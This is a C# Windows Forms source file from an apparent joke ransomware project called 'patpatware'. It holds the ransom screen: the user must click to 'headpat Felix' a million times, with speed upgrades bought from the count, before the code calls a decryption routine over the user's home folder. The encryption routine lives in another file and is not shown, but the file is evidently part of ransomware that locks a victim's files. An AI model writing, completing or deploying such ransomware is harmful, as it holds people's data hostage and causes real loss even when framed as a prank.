using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace patpatware
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e) {}
        private static int patCount = 0;
        private static int patSpeed = 1;

        private static int decryptionCost = 1000000;
        private static int add1Cost = 1000;
        private static int add5Cost = 5000;
        private static int add10Cost = 10000;
        private static int addDoubleCost = 100000;

        public static string userName = Environment.UserName;
        private void headpatter_Click(object sender, EventArgs e)
        {
            if(patCount >= decryptionCost)
            {
                patCount = decryptionCost;
                Program.scanFilesForDecryption(@"C:\Users\" + Program.currentUser);
                this.decryptNotifier.Text = "All your files are decrypted now!";
            }

            else
            {
                patCount += patSpeed;
            }
            this.patText.Text = "You have headpatted Felix " + patCount + " times\r\n";
            this.remainCount.Text = decryptionCost - patCount + " headpats to go!";
        }

        private void add1_Click(object sender, EventArgs e)
        {
            if(patCount > add1Cost)
            {
                patCount -= add1Cost;
                patSpeed += 1;
                this.patText.Text = "You have headpatted Felix " + patCount + " times\r\n";
                this.remainCount.Text = decryptionCost - patCount + " headpats to go!";
            }
        }

        private void add5_Click(object sender, EventArgs e)
        {
            if (patCount > add5Cost)
            {
                patCount -= add5Cost;
                patSpeed += 5;
                this.patText.Text = "You have headpatted Felix " + patCount + " times\r\n";
                this.remainCount.Text = decryptionCost - patCount + " headpats to go!";
            }
        }

        private void add10_Click(object sender, EventArgs e)
        {
            if (patCount > add10Cost)
            {
                patCount -= add10Cost;
                patSpeed += 10;
                this.patText.Text = "You have headpatted Felix " + patCount + " times\r\n";
                this.remainCount.Text = decryptionCost - patCount + " headpats to go!";
            }
        }

        private void addDouble_Click(object sender, EventArgs e)
        {
            if (patCount > addDoubleCost)
            {
                patCount -= addDoubleCost;
                patSpeed *= 2;
                this.patText.Text = "You have headpatted Felix " + patCount + " times\r\n";
                this.remainCount.Text = decryptionCost - patCount + " headpats to go!";
            }
        }
    }
}
